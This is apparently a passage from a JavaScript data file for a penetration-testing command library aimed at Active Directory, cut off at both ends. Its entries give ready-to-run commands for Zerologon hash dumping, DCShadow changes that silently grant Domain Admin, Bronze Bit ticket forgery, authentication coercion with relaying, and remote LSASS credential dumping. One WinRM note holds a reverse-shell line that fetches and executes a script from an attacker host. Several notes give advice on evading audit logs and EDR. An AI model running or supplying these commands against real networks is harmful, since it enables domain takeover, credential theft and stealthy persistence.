notes:'SAVE ORIGINAL HASH BEFORE EXPLOIT: impacket-secretsdump {DOMAIN}/{USERNAME}:{PASSWORD}@{DC_IP} -just-dc-user {DC_NAME}$ — note the hexhash. Then: Step 1 — exploit.py sets DC$ password to empty string. Step 2 — secretsdump with empty password dumps ALL hashes (krbtgt, all users, all computers). Step 3 — IMMEDIATELY restore the DC$ password using restorepassword.py with the saved original hexhash. Failing to restore = domain auth breaks for all users. Exploit code: https://github.com/dirkjanm/CVE-2020-1472. Use {DC_NAME} = short NetBIOS machine name, NOT the FQDN.'}

,{id:'DCSHADOW_001',phase:'domain-dominance',title:'DCShadow — Stage Attribute Change',desc:'Register attacker as a rogue DC and stage a silent AD attribute modification',tool:'Mimikatz',os:'windows',noise:'high',auth:'required',
cmd:'lsadump::dcshadow /object:{TARGET_USER} /attribute:primaryGroupID /value:512',
failureIndicators:['Not DA or EA','SYSTEM privilege required on the push process','DC does not replicate to your network segment'],
warning:'Requires TWO simultaneous Mimikatz instances. Very noisy if AD auditing tracks new DC registration.',
notes:'DCShadow lets you push arbitrary AD changes during replication without most audit logs triggering. Requires TWO simultaneous Mimikatz processes on the SAME machine: Process 1 (SYSTEM): will run lsadump::dcshadow /push (next command). Process 2 (DA): run THIS command to stage the change. Common uses: /attribute:primaryGroupID /value:512 (silently make user a DA), /attribute:sidhistory /value:{ENTERPRISE_ADMIN_SID} (add SID history), /attribute:scriptpath /value:malicious.bat (set login script). To run Process 1 as SYSTEM: PsExec64.exe -s mimikatz.exe then lsadump::dcshadow /push.'}

,{id:'DCSHADOW_002',phase:'domain-dominance',title:'DCShadow — Push Replication',desc:'Trigger AD replication to commit the DCShadow staged change to all DCs',tool:'Mimikatz',os:'windows',noise:'high',auth:'required',
cmd:'lsadump::dcshadow /push',
failureIndicators:['Push process died before push','Replication blocked by network ACLs','Staging Mimikatz not running'],
notes:'Run this in the SECOND Mimikatz window (AS SYSTEM, e.g. via PsExec -s). Both Mimikatz processes must run simultaneously — one as DA staging the change, one as SYSTEM pushing replication. /push triggers replication and commits the change to the real DCs. The window is brief (~30 seconds). Verify after push: Get-ADUser {TARGET_USER} -Properties primaryGroupID. Rogue DC objects are auto-cleaned after push. If it times out: ensure RPC replication ports are open between your machine and the DC.'}

,{id:'BRONZE_BIT_001',phase:'domain-dominance',title:'Bronze Bit (CVE-2020-17049)',desc:'Forge forwardable S4U tickets to bypass "account is sensitive" delegation protection',tool:'Impacket',os:'linux',noise:'low',auth:'required',
cmd:'impacket-getST -spn cifs/{DC_NAME}.{DOMAIN} -impersonate Administrator -hashes :{NTHASH} -dc-ip {DC_IP} {DOMAIN}/{TARGET_SERVICE_ACCOUNT} -force-forwardable',
failureIndicators:['Service account has no constrained delegation configured','Patch KB4598347 applied (Jan 2021)','AES key may be required: add -aesKey {AES_KEY}'],
notes:'Bronze Bit (CVE-2020-17049) bypasses the "Account is sensitive and cannot be delegated" protection flag. Normally S4U2Proxy requires a forwardable TGS — the sensitive flag blocks this. The -force-forwardable switch forges the forwardable bit in the PAC. Requirements: a compromised service account with constrained delegation configured (check: Get-DomainUser -TrustedToAuth) plus its NTLM hash or AES key. Result: a TGS ticket impersonating Administrator for the target SPN. Use it: export KRB5CCNAME=Administrator.ccache && impacket-smbclient -k -no-pass {DC_NAME}.{DOMAIN}. Patched January 2021 (KB4598347).'}

,{id:'COERCE_001',phase:'domain-dominance',title:'Coercer (Multi-Method Auth Coercion)',desc:'Force DC to authenticate to attacker using all 12+ available MS-RPC coercion methods',tool:'Coercer',os:'linux',noise:'high',auth:'required',
cmd:"coercer coerce -u {USERNAME} -p '{PASSWORD}' -d {DOMAIN} -l {ATTACKER_IP} -t {DC_IP} --always-continue",
failureIndicators:['Valid domain creds required','All coercion paths patched','Firewall blocks RPC port 135'],
notes:"Coercer automates 12+ MS-RPC coercion methods: MS-EFSR (PetitPotam), MS-DFSNM (DFSCoerce), MS-FSRVP (ShadowCoerce), MS-RPRN (PrinterBug), MS-EFSRPC, and more. At least one is usually unpatched. SETUP FIRST: start Responder (to capture hash) OR ntlmrelayx (to relay auth). -l = your listener IP where auth will be sent. --always-continue tries all methods even after one succeeds. Scan mode only (no coercion): coercer scan -u {USERNAME} -p '{PASSWORD}' -d {DOMAIN} -t {DC_IP}. Install: pip3 install coercer. Chain with ntlmrelayx --delegate-access for RBCD-to-DCSync."}

,{id:'COERCE_002',phase:'domain-dominance',title:'DFSCoerce (MS-DFSNM)',desc:'Coerce DC authentication via Distributed File System Namespace Management protocol',tool:'DFSCoerce',os:'linux',noise:'high',auth:'required',
cmd:"python3 dfscoerce.py -u {USERNAME} -p '{PASSWORD}' -d {DOMAIN} {ATTACKER_IP} {DC_IP}",
failureIndicators:['MS-DFSNM not available','Credentials invalid','RPC port blocked'],
notes:'DFSCoerce exploits MS-DFSNM (Distributed File System Namespace Management) to coerce DC authentication. Use when PetitPotam and PrinterBug are patched. Requires valid domain credentials to trigger. Setup: run ntlmrelayx or Responder FIRST. Chain with ntlmrelayx --delegate-access: the relayed DC machine auth creates a computer account with RBCD delegation rights over the DC → use impacket-getST to impersonate DA → DCSync. Install: git clone https://github.com/ly4k/DFSCoerce && pip3 install impacket.'}

,{id:'COERCE_003',phase:'domain-dominance',title:'ShadowCoerce (MS-FSRVP)',desc:'Coerce DC authentication via Shadow Copy / File Server Remote VSS Protocol',tool:'ShadowCoerce',os:'linux',noise:'high',auth:'required',
cmd:"python3 shadowcoerce.py -u {USERNAME} -p '{PASSWORD}' -d {DOMAIN} {ATTACKER_IP} {DC_IP}",
failureIndicators:['MS-FSRVP not enabled on target (not default)','Credentials invalid','Patched or VSS service disabled'],
notes:'ShadowCoerce exploits MS-FSRVP (File Server Remote VSS Protocol). Unlike PrinterBug, MS-FSRVP is NOT enabled by default — check first: sc query vss on the target. Use when PetitPotam and DFSCoerce fail. Same relay setup: ntlmrelayx -tf targets.txt --delegate-access before running this. Install: git clone https://github.com/ShutdownRepo/ShadowCoerce. Check all coercion methods at once with Coercer scan mode instead of testing each tool individually.'}

// PHASE: ENUMERATION - Extended NetExec and AD Object Coverage
// ═══════════════════════════════════════════════════════════════════════════════════════════

,{id:'NXC_002',phase:'enumeration',title:'NetExec spider_plus (Deep Share Crawl)',desc:'Recursively crawl all shares across the network and save file listings as JSON',tool:'NetExec',os:'linux',noise:'med',auth:'required',
cmd:"nxc smb {NETWORK}.0/24 -u {USERNAME} -p '{PASSWORD}' -M spider_plus -o EXCLUDE_EXTS=ico,lnk,css,png,jpg",
failureIndicators:['Access denied on all shares','No readable shares found','Update nxc if module missing: pip3 install netexec'],
notes:'spider_plus crawls ALL readable shares and saves full file paths to /tmp/nxc_spider_plus/{IP}.json. Parse: cat /tmp/nxc_spider_plus/{TARGET_IP}.json | python3 -m json.tool. Find sensitive files: grep -r -i "password\|credential\|secret\|vnc\|unattend\|web.config\|id_rsa" /tmp/nxc_spider_plus/. EXCLUDE_EXTS skips binary/image files. Focus on: SYSVOL (GPO scripts, possible creds), NETLOGON (login scripts), IT/Admin/Backup shares. This often finds cleartext passwords in old scripts and config files.'}

,{id:'NXC_003',phase:'enumeration',title:'NetExec RDP Check',desc:'Identify which hosts accept RDP with current credentials across the subnet',tool:'NetExec',os:'linux',noise:'low',auth:'required',
cmd:"nxc rdp {NETWORK}.0/24 -u {USERNAME} -p '{PASSWORD}'",
failureIndicators:['RDP not enabled','NLA blocks unauthenticated check','Firewall blocks TCP 3389'],
notes:'Green [+] = valid RDP access. (Pwn3d!) = local admin. PTH via RDP (Restricted Admin Mode): nxc rdp {TARGET_IP} -u {USERNAME} -H {NTHASH}. Check if Restricted Admin Mode is enabled: reg query "HKLM\\System\\CurrentControlSet\\Control\\Lsa" /v DisableRestrictedAdmin — value 0 = enabled. Enable it (needs local admin): reg add "HKLM\\System\\CurrentControlSet\\Control\\Lsa" /v DisableRestrictedAdmin /t REG_DWORD /d 0 /f. Then use xfreerdp with /pth: xfreerdp /v:{TARGET_IP} /u:{USERNAME} /pth:{NTHASH} /cert-ignore.'}

,{id:'NXC_004',phase:'credential-access',title:'NetExec lsassy (Remote LSASS Dump)',desc:'Dump LSASS credentials remotely across the network without uploading files to disk',tool:'NetExec',os:'linux',noise:'high',auth:'required',
cmd:"nxc smb {NETWORK}.0/24 -u {USERNAME} -p '{PASSWORD}' -M lsassy",
failureIndicators:['Local admin required','LSASS PPL-protected','EDR kills lsassy mid-dump'],
notes:"lsassy dumps LSASS remotely via various methods — no binary upload to disk. Default method: comsvcs.dll MiniDump. If blocked: specify method: nxc smb ... -M lsassy -o METHOD=COMSVCS or -o METHOD=NANODUMP or -o METHOD=PROCDUMP. Requires local admin. Very effective for lateral movement — DA/service account creds are often cached in LSASS on member servers. Results auto-saved. Alternative standalone: lsassy -u {USERNAME} -p '{PASSWORD}' {TARGET_IP}. Also try: nxc smb ... -M nanodump for a stealthier approach."}

,{id:'NXC_005',phase:'lateral-movement',title:'NetExec WinRM Command Execution',desc:'Run commands via WinRM across the network — great for lateral movement',tool:'NetExec',os:'linux',noise:'med',auth:'required',
cmd:"nxc winrm {NETWORK}.0/24 -u {USERNAME} -p '{PASSWORD}' -x \"whoami /all\"",
failureIndicators:['WinRM not enabled — ports 5985/5986 closed','Not in Remote Management Users group','Firewall blocks WinRM'],
notes:"WinRM is enabled by default on DCs and usually on Windows servers. -x = CMD command. -X = PowerShell command. Green [+] = valid. (Pwn3d!) = local admin. For reverse shell: nxc winrm {TARGET_IP} -u {USERNAME} -p '{PASSWORD}' -X \"IEX(New-Object Net.WebClient).downloadString('http://{ATTACKER_IP}:8001/shell.ps1')\". Enable WinRM (needs admin): Enable-PSRemoting -Force. For interactive evil-winrm shell: evil-winrm -i {TARGET_IP} -u {USERNAME} -p '{PASSWORD}'. PTH: nxc winrm ... -H {NTHASH} instead of -p."}

,{id:'ENUM_COMP_001',phase:'enumeration',title:'Get-DomainComputer (Full Machine Inventory)',desc:'Enumerate all domain computers with OS version to map your attack surface',tool:'PowerView',os:'windows',noise:'low',auth:'required',
cmd:'Get-DomainComputer -Properties Name,dnshostname,operatingsystem,operatingsystemversion,lastlogon | Sort-Object operatingsystem | Format-Table -AutoSize',
failureIndicators:['PowerView not loaded','LDAP access denied'],
notes:'This reveals your full attack surface. Sort by OS to find easy targets: Windows Server 2008/2012/2016 = likely unpatched with known exploits (MS17-010, PrintNightmare, etc.), Windows 7/XP = end-of-life with decades of public exploits. lastlogon column shows active machines — better pivot points. Find unconstrained delegation computers (very high value): Get-DomainComputer -Unconstrained — getting local admin on one of these lets you coerce DCs and capture their TGTs. Export all: Get-DomainComputer | Export-Csv computers.csv -NoTypeInformation.'}

,{id:'ENUM_OU_001',phase:'enumeration',title:'Get-DomainOU (OUs and GPO Links)',desc:'Enumerate Organizational Units and which GPOs are applied to each',tool:'PowerView',os:'windows',noise:'low',auth:'required',
cmd:'Get-DomainOU | Select-Object name,distinguishedname,gplink | Format-Table -AutoSize\nGet-DomainOU | Get-ObjectAcl -ResolveGUIDs | ?{$_.ActiveDirectoryRights -match "Write" -and $_.SecurityIdentifier -match "{USERNAME}"}',
failureIndicators:['PowerView not loaded','No OUs visible'],
notes:'OUs organize the domain and determine GPO scope. gplink shows linked GPOs (as GUIDs — resolve with: Get-DomainGPO -Identity "{GUID}"). Understanding OUs helps: find where privileged accounts live (IT OU, Admin OU), scope GPO attacks to specific departments, identify GPOs you can write (second command checks your ACL rights on each OU). If you can write a GPO linked to a high-value OU, you can push malicious startup scripts or local admin rights to every machine in that OU.'}

,{id:'ENUM_TRUST_001',phase:'enumeration',title:'Domain and Forest Trust Enumeration',desc:'Map all domain trusts to identify cross-domain and cross-forest attack paths',tool:'PowerView',os:'windows',noise:'low',auth:'required',
cmd:'Get-DomainTrust | Format-Table SourceName,TargetName,TrustDirection,TrustType,SIDFiltering -AutoSize\nGet-ForestTrust | Format-Table SourceName,TargetName,TrustDirection -AutoSize',
failureIndicators:['PowerView not loaded','Not a domain member'],
notes:'Trusts define attack paths between domains. TrustDirection: Bidirectional = attack both ways, Inbound = they trust us (we can use their resources), Outbound = we trust them. TrustType: ParentChild (automatic two-way within same forest), Forest (explicit cross-forest), External (non-forest domain). SIDFiltering=False means ExtraSIDs attacks work across the trust — you can inject parent domain SIDs into tickets from the child domain. Key attack: child-to-parent domain escalation — create golden ticket with parent domain EA SID in ExtraSIDs field using krbtgt hash of child domain. Impacket (from Linux): impacket-lookupsid {DOMAIN}/{USERNAME}:{PASSWORD}@{DC_IP}'}

,{id:'ENUM_SITE_001',phase:'enumeration',title:'AD Sites and Subnets Enumeration',desc:'Map AD sites to IP subnets to discover internal network topology and hidden ranges',tool:'PowerShell',os:'windows',noise:'low',auth:'required',
cmd:'[System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest().Sites | ForEach-Object { $s=$_.Name; $_.Subnets | ForEach-Object { "$s : $_" } }',
failureIndicators:['Not domain-joined','No subnets configured (common in small environments)'],
